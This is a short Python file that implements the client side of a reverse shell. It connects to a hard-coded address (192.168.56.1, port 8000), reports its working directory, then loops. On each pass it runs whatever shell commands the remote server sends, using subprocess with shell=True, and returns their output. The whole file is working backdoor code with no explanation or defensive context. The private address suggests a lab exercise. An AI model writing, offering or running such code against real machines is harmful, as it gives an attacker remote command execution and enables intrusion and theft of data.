import socket, os, subprocess
from network import Network

# socket.gethostbyname(socket.gethostname())
ADDRESS = ("192.168.56.1", 8000)


client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.connect(ADDRESS)

net = Network(client)
net.send(os.getcwd())
while True:
    command = net.recv()
    cwd = net.recv()

    if command.startswith("cd"):
        net.send(str(os.path.exists(cwd)))
        continue

    proc = subprocess.Popen(args=command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True, cwd=cwd)
    out, err = proc.communicate()

    if err:
        net.send_bytes(err)
    else:
        net.send_bytes(out)